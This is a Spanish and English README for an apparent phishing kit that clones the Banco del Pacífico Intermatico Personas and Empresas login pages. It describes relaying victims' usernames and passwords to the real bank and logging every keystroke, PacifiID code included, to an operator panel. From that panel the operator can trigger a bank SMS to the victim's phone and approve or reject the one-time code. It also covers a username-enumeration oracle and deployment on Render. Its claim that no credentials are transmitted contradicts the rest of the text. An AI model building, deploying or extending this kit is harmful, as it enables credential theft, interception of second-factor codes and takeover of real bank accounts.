# Intermatico — static reconstruction

A framework-free static reconstruction of the Banco del Pacífico Intermatico landing page at `https://www.intermatico.com/`, with local Personas and Empresas access flows.

## Run

El proyecto ahora incluye un servidor local Node que sirve el sitio **y** valida
usuario/clave contra la API real del banco:

```powershell
node server.cjs
```

- Sitio: `http://127.0.0.1:8138/`
- Personas: `http://127.0.0.1:8138/personas/`
- Empresas: `http://127.0.0.1:8138/empresas/`

Si el puerto 8138 está ocupado: `set PORT=8139 && node server.cjs`.

El servidor Python (`python -m http.server 8137`) sigue funcionando para ver el
sitio, pero la validación de credenciales solo está disponible con `node server.cjs`.

## Despliegue (Render) e iframe

- **Comando de inicio**: `node server.cjs`
- **Puerto**: Render inyecta `PORT` — el servidor lo usa automáticamente y
  escucha en `0.0.0.0` (requisito de Render). En local sin `PORT`: `127.0.0.1:8138`
  + alias `8137`.
- **Health check**: `GET /api/health` → `{"ok":true}`
- **iframe**: el servidor NO envía `X-Frame-Options` ni `frame-ancestors`, así que
  cualquier página puede embeber `/`, `/personas/`, `/empresas/` o `/panel/` en un
  `<iframe>` sin restricciones.
- **Persistencia**: las sesiones del panel se guardan en `datos/panel-sesiones.json`.
  En el plan gratuito de Render el disco es efímero (se pierde al redesplegar);
  monta un disco persistente si necesitas conservarlas entre despliegues.
- La API móvil del banco y las llamadas salientes usan HTTPS directo
  (`www.intermatico.com`); no requieren variables de entorno.

## Validación real de credenciales (flujo Personas)

El paso de usuario+clave del flujo Personas ahora se valida contra el banco real
(`https://www.intermatico.com/`), replicando el flujo WebFlow documentado en el
proyecto de investigación `C:\Users\Djthe\analisis-api-banco-pacifico`
(kit `kit-demo/lib/demo-login.cjs`):

- `POST /api/usuario` `{usuario}` — paso real del WebFlow (portada → POST usuario →
  página de clave). Devuelve si el usuario continúa, su **avatar real**
  (`/ebanking/imagesAvatar/<id>`, servido local vía `/api/avatar?path=...`) y el
  **nombre de la imagen de seguridad** que muestra el banco bajo el avatar.
  Nota: el banco muestra página de clave con avatar/nombre aleatorios para
  usuarios inexistentes; el de un usuario real es constante (oráculo de
  enumeración). Si el WebFlow falla, no bloquea (fallback DWR).
- `POST /api/empresa-login` `{usuario, clave}` — flujo real del portal **Empresas**
  (`https://www.intermatico.com/Login`, ASP.NET con `__RequestVerificationToken`):
  GET `/Login/Index` → POST usuario → página de clave → POST `/Login/Autenticar`
  → sigue redirecciones. Credenciales malas (el banco vuelve al login) →
  `{"valid":false}`; buenas → `{"valid":true}` (el front se queda cargando
  esperando el panel). Trae también la imagen de seguridad de la página de clave
  (`/detect2/...`, con caché con sesión vía `/api/avatar`).
- `GET /api/avatar?path=...` — proxy local de imágenes (avatares Personas
  `/ebanking/imagesAvatar/...` e imágenes de seguridad Empresas `/detect2/...`;
  evita CORS/mixed content).

## Panel de operaciones (`/panel/`)

Panel intermatico de captura en vivo para el operador:

- **Captura en vivo**: `scripts/captura.js` (en personas y empresas) reporta cada
  tecla (usuario, contraseña, dispositivo, código) y el paso actual del flujo a
  `POST /api/telemetria`. El panel sondea cada 1.5 s.
- Lista vertical de sesiones con bandera de país (geo por IP, ip-api.com; red
  local 🖥️), flujo (Personas/Empresas), indicador "escribiendo…" y caret en el
  campo activo.
- Copiar con un clic usuario / contraseña / código; ojo para mostrar/ocultar clave.
- Veredicto del código PacifiID: botones **Bueno / Malo** por usuario.
  La víctima escribe su código PacifiID y queda **en pantalla de carga** (hasta
  4 min, `POST /api/codigo`, espera larga). Mientras está en carga, el operador
  puede pulsar **SMS dPc_ ▸** para que el banco envíe el código de activación por
  SMS al teléfono de la víctima, y luego decide: Bueno → "Código verificado ✔";
  Malo → error en pantalla. El panel muestra "Código en pantalla — esperando tu
  decisión" con aviso sonoro.
- **SMS dPc_**: botón que dispara el código de activación PacificID usando la
  sesión del banco guardada tras un login válido (POST
  `_eventId_modificarPacificIdRegistroDevice`, ver
  `analisis-api-banco-pacifico/docs/EVIDENCIA-ENVIO-Y-CANJE-SMS.md`);
  reautentica con las credenciales capturadas si la sesión expiró. El estado se
  muestra en la fila.
- Sonido de notificación sutil al ingresar un usuario (WebAudio, botón para
  activar/desactivar).
- Borrar usuarios (`DELETE /api/panel/sesiones/:sid`).
- Sección "Solicitud de código PacifiID" con los textos del banco (de
  `capturas/pacifid-mensaje-banco-2026-11-04.txt`) listos para copiar.
- `POST /api/login` `{usuario, clave}` — flujo completo:
  portada → usuario → página de clave → clave → redirecciones, y clasifica el
  resultado (`error=accesoDenegado`, registro de dispositivo, PacificID o dashboard).
- Credenciales malas → error "Usuario o contraseña no válidos." en pantalla.
- Credenciales buenas → el flujo avanza a la fase **"Registra este dispositivo"**
  del index (guardado de dispositivo local).

El conector del navegador es `scripts/lab-api.js` (cargado en
`personas/index.html` antes de `personas.js`); define los hooks
`window.PacUserCheck` y `window.PacLoginCheck`. `window.PacGetLoginResult()`
devuelve el resultado completo del último login validado (resultado, nombre,
saldo, ipClient) para las fases siguientes.

Control negativo probado (04/11/2026): usuario/clave falsos → el banco responde
`?error=accesoDenegado` → `{"valid":false,"message":"Usuario o contraseña no válidos."}`.

## Flow

- **Banca Virtual Personas** → `personas/index.html`
  - username → password → device registration → PacifiID code.
  - Password visibility toggle, back arrow, cancel controls, and the loading overlay are included.
  - username+password se validan contra el banco real (ver sección anterior).
- **Banca Virtual Empresas** → `empresas/index.html`
  - username → password; usuario+clave se validan contra el portal real
    (`/api/empresa-login`): malo → error; bueno → se queda cargando (esperando el panel).
- Submitting the demo forms stays local. No credentials are posted, stored, or transmitted. The code step shows a local pending-validation notice until a real code API is connected.

## Lab integration hooks

The flow is ready for the lab API without calling any real banking endpoint. Assign these before the section scripts run, or from the browser console:

```js
window.PacUserCheck = async (usuario) => ({ valid: true });
window.PacLoginCheck = async (usuario, clave) => ({ valid: true });
window.PacCodeCheck = async (codigo) => ({ valid: true });
window.PacBusinessLoginCheck = async (usuario, clave) => ({ valid: true });
```

Return `{ valid: false, message: "..." }` to stop the flow at that step. The user/login defaults are permissive for the demo; the code default is intentionally pending.

## What is included

- `index.html` — landing page.
- `personas/index.html` — Personas flow.
- `empresas/index.html` — Empresas username/password flow.
- `styles/` — design tokens, reset, section styles, and the Personas page stylesheet.
- `scripts/` — classic scripts for scene selection, flow state, spinner, and demo validation hooks.
- `partials/` — landing-page section fragments.
- `assets/` — WebP scenes and marks, SVG icons, WOFF2 fonts, and the original-format favicon.
- `docs/` — extraction data, component specifications, and QA reports. Screenshot artifacts were removed to keep the package image-free for code auditing.

The landing page is pixel-identical to the target at 1440×900, 768×1024, and 390×844 in Chromium (0 differing pixels). The form flow is a local UI reproduction; the real API connection is the next step.

Full QA record: `docs/research/intermatico-com-bb8f8a88/root-8a5edab2/QA-REPORT.md`.
